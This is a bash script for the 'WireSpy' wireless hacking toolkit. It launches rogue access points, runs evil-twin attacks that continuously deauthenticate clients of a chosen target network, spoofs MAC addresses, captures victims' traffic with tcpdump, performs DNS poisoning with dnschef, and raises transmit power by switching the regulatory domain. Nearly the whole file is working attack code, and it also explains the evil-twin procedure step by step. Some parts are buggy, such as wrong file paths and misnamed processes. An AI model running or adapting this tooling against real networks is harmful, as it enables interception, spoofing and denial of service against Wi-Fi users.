#!/usr/bin/env bash
#
#    Copyright (C) 2015-2018 Alexandre Teyar
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# Script information
VERSION=0.4

# Colors and output formatting
BOLD='\e[1m'
RESET_ALL='\e[0m'
RESET_BOLD='\e[21m'
UNDERLINED='\e[4m'

FG_BLACK='\e[30m'
FG_CYAN='\e[36m'
FG_YELLOW='\e[33m'
FG_WHITE='\e[97m'

BG_BLUE='\e[44m'
BG_CYAN='\e[46m'
BG_DARKGREY='\e[100m'
BG_GREEN='\e[42m'
BG_RED='\e[41m'
BG_YELLOW='\e[43m'

PROMPT="${BG_CYAN}${FG_WHITE}${BOLD}wirespy$RESET_ALL »"
PROMPT_EVILTWIN="${BG_CYAN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > eviltwin$RESET_ALL »"
PROMPT_HONEYPOT="${BG_CYAN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > honeypot$RESET_ALL »"

print_error()   { echo -e "${BG_RED}${BOLD}[!] $1$RESET_ALL"; }
print_info()    { echo -e "[*] $1"; }
print_intf()    { echo -e "${FG_CYAN}${BOLD}$1$RESET_ALL"; }
print_warning() { echo -e "${FG_YELLOW}[-] $1$RESET_ALL"; }

# Global variables
isAP="false"
isDHCP="false"
isDNS="false"
isSniffing="false"

attack_type="null"

INTF="null"
WINTF="null"
MINTF="null"
TINTF="null"
WCHAN="null"

trap quit INT


function banner() {
    cat << EOF 
.##......##.####.########..########..######..########..##....##
.##..##..##..##..##.....##.##.......##....##.##.....##..##..##.
.##..##..##..##..##.....##.##.......##.......##.....##...####..
.##..##..##..##..########..######....######..########.....##...
.##..##..##..##..##...##...##.............##.##...........##...
.##..##..##..##..##....##..##.......##....##.##...........##...
..###..###..####.##.....##.########..######..##...........##...
EOF
}  


function copyright() {
    cat << EOF

[---]          Wireless Hacking Toolkit (WireSpy)         [---]
[---]            Author: Alexandre Teyar (Ares)           [---]
[---]                     Version: $VERSION                    [---]
[---]              GitHub: github.com/AresS31             [---]
[---]      LinkedIn: linkedin.com/in/alexandre-teyar      [---]

EOF
} 

function menu() {
    echo "Select an option from the following menu:

    1)  Launch a rogue access point (honeypot)
    2)  Perform an evil-twin attack
    3)  Start/stop DHCP server
    4)  Start/stop network capture
    5)  Start/stop DNS poisoning (in development)
    6)  Boost wireless card power
    99) Exit WireSpy 

    Press 'CTRL+C' at any time to exit
    "

    AP_PREREQUISITE="To use this option, first configure an access-point"

    # Find a more elegant solution...
    while :; do
        read -p "$(echo -e $PROMPT) " choice

        if [[ $choice = 1 ]]; then
            clean_up > /dev/null
            PROMPT=$PROMPT_HONEYPOT
            configure_intfs
            menu_honeypot
            configure_honeypot
            isAP="true"

        elif [[ $choice = 2 ]]; then
            clean_up > /dev/null
            PROMPT=$PROMPT_EVILTWIN
            configure_intfs
            menu_eviltwin
            configure_eviltwin
            isAP="true"

        elif [[ $choice = 3 ]]; then
            if [[ $isAP = "false" ]]; then
                print_warning $AP_PREREQUISITE
            else
                if [[ $isDHCP = "false" ]]; then
                    start_DHCP_server
                else
                    stop_DHCP_server
                fi
            fi

        elif [[ $choice = 4 ]]; then
            if [[ $isAP = "false" ]]; then
                print_warning $AP_PREREQUISITE
            else
                if [[ $isSniffing = "false" ]]; then
                    start_network_capture
                else
                    stop_network_capture
                fi
            fi

        elif [[ $choice = 5 ]]; then
            if [[ $isAP = "false" ]]; then
                print_warning $AP_PREREQUISITE
            else
                if [[ $isDNS = "false" ]]; then
                    start_DNS_poisonning
                else
                    stop_DNS_poisonning
                fi
            fi

        elif [[ $choice = 6 ]]; then
            PROMPT="$PROMPT power-up > "
            intf_boost

        elif [[ $choice = 99 ]]; then
            quit

        else
            print_warning "Invalid option: $choice"
        fi
    done
}


function configure_intfs() {
    local pass="false"
    local res=1

    display_intf

    echo "Internet facing interface?"

    while [[ $res != 0 ]]; do
        read -p "$(echo -e $PROMPT) " INTF
        check_intf "$INTF"
        res=$?
    done
    res=1

    echo "Do you want to randomise $INTF MAC address (this can cause problems)? Answer with y (yes) or n (no)"

    while [[ $pass != "true" ]]; do
        read -p "$(echo -e $PROMPT) " choice

        if [[ $choice = "y" ]]; then
            print_info "Macchanging $INTF"
            ip link set "$INTF" down && macchanger -A "$INTF" && ip link set "$INTF" up
            print_warning "In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)"
            pass="true"
        elif [[ $choice = "n" ]]; then
            pass="true"
        else
            print_warning "Invalid answer: $choice"
        fi
    done
    pass="false"

    # prevent wlan adapter soft blocking
    rfkill unblock wifi
    display_wintf

    echo "Wireless interface to use?"

    while [[ $res != 0 ]]; do
        read -p "$(echo -e $PROMPT) " WINTF
        check_intf "$WINTF"
        res=$?

        if [[ $WINTF = "$INTF" ]]; then
            print_warning "$INTF is already in use, choose another inteface..."
            res=1
        fi
    done
    res=1

    # put the wireless interface in "monitor" mode
    print_info "Starting monitor mode on $WINTF"
    ip link set "$WINTF" down && iw dev "$WINTF" set type monitor && ip link set "$WINTF" up
    MINTF=${WINTF}
    # crucial to let WINTF come up before macchanging
    sleep 2

    check_intf "$MINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "$WINTF could not enter in monitor mode"
        exit 1
    fi

    echo "Do you want to randomise $MINTF MAC address (recommended)? Answer with y (yes) or n (no)"

    while [[ $pass != "true" ]]; do
        read -p "$(echo -e $PROMPT) " choice

        if [[ $choice = "y" ]]; then
            print_info "Macchanging $MINTF"
            ip link set "$MINTF" down && macchanger -A "$MINTF" && ip link set "$MINTF" up
            pass="true"
        elif [[ $choice = "n" ]]; then
            pass="true"
        else
            print_warning "Invalid answer: $choice"
        fi
    done
}


function menu_honeypot() {
    echo "
The Blackhole access point type will respond to all probe requests (the access point may receive a lot of requests in crowded places - high charge).

The Bullzeye access point type will respond only to the probe requests specifying the access point ESSID.

    1) Blackhole
    2) Bullzeye
    "

    local pass="false"

    while [[ $pass != "true" ]]; do
        read -p "$(echo -e $PROMPT) " choice

        case $attack_type in
            [1-2])
                pass="true";;
            *) 
                print_warning "Invalid option: $attack_type"
                pass="false";;
        esac
    done
}


function menu_eviltwin() {
    echo "
This attack consists in creating an evil copy of an access point and repeatedly sending deauth packets to its clients to force them to connect to our evil copy.
Consequently, choose the same ESSID and wireless channel as the targeted access point.

To properly perform this attack the attacker should first scan all the in-range access points to select a target. Next step is to copy the BSSID, ESSID and channel of the selected target access point, to create its twin.
The final step is to deauthenticate all the clients from the target access point, so that the victims may connect to the evil twin.
"
}


function configure_honeypot() {
    local pass="false"
    local res=1

    echo "Access point ESSID?"
    read -p "$(echo -e $PROMPT) " ESSID

    while [[ $pass != "true" ]]; do
        echo "Wireless channel to use (1-12)?"
        read -p "$(echo -e $PROMPT) " WCHAN

        case $WCHAN in 
            [1-9]|1[0-2])
                pass="true";;
            *) 
                print_warning "$WCHAN is not a valid wireless channel"
                pass="false";;
        esac
    done
    pass="false"

    while [[ $pass != "true" ]]; do
        echo "Enable WEP authentication for the access-point? Answer with y (yes) or n (no)"
        read -p "$(echo -e $PROMPT) " choice

        if [[ $attack_type = 1 ]]; then
            if [[ $choice = "y" ]]; then
                echo "Enter a valid WEP password (10 hexadecimal characters):"
                read -p "$(echo -e $PROMPT) " WEP 
                
                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                pass="true"
            elif [[ $choice = "n" ]]; then
                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                pass="true"
            else
                print_warning "Invalid answer: $choice"
                pass="false"
            fi

        elif [[ $attack_type = 2 ]]; then
            if [[ $choice = "y" ]]; then
                echo "Enter a valid WEP password (10 hexadecimal characters)"
                read -p "$(echo -e $PROMPT) " WEP 

                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                pass="true"
            elif [[ $choice = "n" ]]; then
                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                pass="true"
            else
                print_warning "Invalid answer: $choice"
                pass="false"
            fi
        fi
    done

    # crucial, to let TINTF come up before setting it up
    sleep 2                  
    # storing the terminal pid
    xterm_AP_PID=$(pgrep --newest Eterm)

    # extracting the tap interface
    TINTF=$(grep "Created tap interface" ./conf/tmp.txt | awk '{print $5}')

    check_intf "$TINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "An error occured with airbase-ng, no tap interface was created"
        sleep 4
        quit
    fi

    set_up_iptables
    set_up_DHCP_srv
    
    print_info "$ESSID is now running"
    sleep 6
}


function configure_eviltwin() {
    local pass="false"
    local res=1

    echo "ESSID for the evil-twin?"
    read -p "$(echo -e $PROMPT) " eviltwin_ESSID

    echo "BSSID for the evil-twin?"
    read -p "$(echo -e $PROMPT) " eviltwin_BSSID

    while [[ $pass != "true" ]]; do
        echo "Wireless channel to use (value between 1 and 12)? (use the same channel than the legitimate access-point)"
        read -p "$(echo -e $PROMPT) " WCHAN

        case $WCHAN in
            [1-9]|1[0-2])
                pass="true";;
            *) 
                print_warning "Invalid wireless channel: $WCHAN"
                pass="false";;
        esac
    done

    echo "$MINTF"
    xterm -fg green -title "Evil-twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &

    sleep 4                                 # crucial to let TINTF come up before setting it up
    xterm_AP_PID=$(pgrep --newest Eterm)    # storing the terminal pid 

    # extracting the tap interface
    TINTF=$(grep "Created tap interface" /conf/tmp.txt | awk '{print $5}')

    check_intf "$TINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "An error occured with airbase-ng, no tap interface was created"
        quit
    fi

    # de-auth the legit connected users
    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID $MINTF" &
    xterm_aireplay_deauth=$(pgrep --newest xterm)

    set_up_iptables
    set_up_DHCP_srv
    
    print_info "$eviltwin_ESSID is now running"
    sleep 6
}


function set_up_iptables() {
    # cleaning the mess
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain

    # iptables rules
    iptables -P FORWARD ACCEPT
    # forward the traffic via the internet facing interface
    iptables -t nat -A POSTROUTING -o "$INTF" -j MASQUERADE
}


function set_up_DHCP_srv() {
    # enable ip forwarding
    echo "1" > /proc/sys/net/ipv4/ip_forward

    # setting up ip, route and stuff
    ip link set "$TINTF" up    
    # a bit of clean-up is always good!
    ip addr flush dev "$TINTF"
    ip addr add 10.0.0.254/24 dev "$TINTF"
    
    # a bit of clean-up is always good!
    ip route flush dev "$TINTF"
    ip route add 10.0.0.0/24 via 10.0.0.254 dev "$TINTF"

    # RESET_ALL any pre-existing dhcp leases
    cat /dev/null > /var/lib/dhcp/dhcpd.leases
    cat /dev/null > /tmp.txt/dhcpd.conf

    # Copy the conf file for the DHCP serv and change the isc-dhcp-server settings
    cp ./conf/dhcpd.conf /etc/dhcp/dhcpd.conf 
    sed -e s/INTERFACES=.*/INTERFACES=\"$TINTF\"/ -i.bak /etc/default/isc-dhcp-server

    # Starting the DHCP service
    dhcpd -cf /etc/dhcp/dhcpd.conf "$TINTF" &> /dev/null
    /etc/init.d/isc-dhcp-server restart &> /dev/null
}


function display_intf() {
    intfs=$(ip -o link show | awk -F': ' '{print $2}' | grep -v 'lo')
    
    echo "Available networking interface(s):"

    if [[ $intfs ]]; then
        for intf in $intfs; do # get the network interfaces names
            IP=$(ip -o -f inet add show "$intf" | awk '{print $4}')
            MAC=$(ip link show "$intf" | awk '/ether/ {print $2}')
            print_intf "${intf}: $IP $MAC"
        done
    else
        print_error "No networking interface detected"
        exit 1
    fi
}


# use the iw utility instead of the ip utility
function display_wintf() {
    wintfs=$(ip -o link show | awk -F': ' '{print $2}' | grep "wlan")
    
    echo "Available wireless interface(s):"

    if [[ $wintfs ]]; then
        for wintf in $wintfs; do # get the interfaces names
            IP=$(ip -o -f inet add show "$wintf" | awk '{print $4}')
            MAC=$(ip link show "$wintf" | awk '/ether/ {print $2}')
            print_intf "${intf}: $IP $MAC"
        done
    else
        print_error "No wireless interface detected"
        exit 1
    fi
}


function check_intf() {
    if [[ $(ip link show "$1" 2> /dev/null) ]]; then
        return 0
    else
        print_warning "Invalid interface: $1"
        return 1
    fi
}  


function start_network_capture() {
    xterm -fg green -title "TCPDump" -e "tcpdump -i $TINTF -w ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap -v" &
    isSniffing="true"
}


function stop_network_capture() {
    pkill tcpdump
    isSniffing="false"
}


function start_DNS_poisonning() {
    xterm -fg green -title "DNSChef" -e "dnschef -i $TINTF -f ./conf/hosts" &
    xterm_sniff_PID=$(pgrep --newest xterm)
    isDNS="true"
}


function stop_DNS_poisonning() {
    pkill dnsspoof
    isDNS="false"
}


function start_DHCP_server() {
    xterm -fg green -title "DHCP server" -e "tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null" &
    xterm_DHCP_PID=$(pgrep --newest xterm)
    isDHCP="true"
}


function stop_DHCP_server() {
    pkill "$xterm_DHCP_PID" &> /dev/null
    isDHCP="false"
}


function intf_boost() {
    local pass="false"

    display_wintf

    echo "Which interface to boost?"

    while [[ $pass != "true" ]]; do
        read -p "$(echo -e $PROMPT) " super_WINTF

        check_intf "$super_WINTF"
    done
    pass="false"

    ip link set "$super_WINTF" down && iw reg set BO && ip link set "$super_WINTF up" 

    echo "How much do you want to boost the power of $super_WINTF (up to 30dBm)?"
    read -p "$(echo -e $PROMPT) " boost

    print_info "$super_WINTF powering up"
    iw dev "$super_WINTF" set txpower fixed "$boost"mBm
    sleep 4
}


function clean_up() {
    local pass="false"
    local res=1

    print_info "Terminating active processes"
    if [[ $isDHCP = "true" ]]; then
        stop_DHCP_server
    elif [[ $isDNS = "true" ]]; then
        stop_DNS_poisonning
    elif [[ $isSniffing = "true" ]]; then
        stop_network_capture
    fi

    killall airbase-ng airplay-ng &> /dev/null
    /etc/init.d/isc-dhcp-server stop &> /dev/null
    
    print_info "Deleting temporary files"
    rm -f ./conf/tmp.txt

    check_intf "$MINTF" &> /dev/null
    res=$?

    if [[ $res = 0 ]]; then
        print_info "Starting managed mode on $MINTF" 
        ip link set "$MINTF" down && iw dev "$MINTF" set type managed && ip link set "$MINTF up"
        sleep 2
    fi
    pass="false"
}


function quit() {
    clean_up
    exit
}


# ensure that the script is running with root privileges
# this step is necessary since WireSpy needs to be perform network changes
if [[ $EUID -ne 0 ]]; then
    print_error "You must run this script as as root using the command: sudo bash ${0}"
    exit 1
fi

banner
copyright
menu
